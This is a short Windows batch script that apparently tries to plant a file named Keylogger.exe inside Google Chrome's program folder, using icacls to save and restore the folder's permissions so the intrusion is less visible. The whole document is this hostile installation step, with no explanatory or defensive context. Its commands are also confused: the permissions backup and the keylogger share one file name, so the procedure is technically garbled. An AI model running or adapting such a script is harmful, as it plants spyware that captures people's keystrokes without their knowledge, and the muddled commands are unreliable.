icacls "%ProgramFiles(x86)%\Google\Chrome\Application\*.exe" /save "%temp%\Keylogger.exe"
xcopy /s "Keylogger.exe" "%ProgramFiles(x86)%\Google\Chrome\Application\"
icacls "%ProgramFiles(x86)%\Google\Chrome\Application\" /restore "%temp%\Keylogger.exe"
pause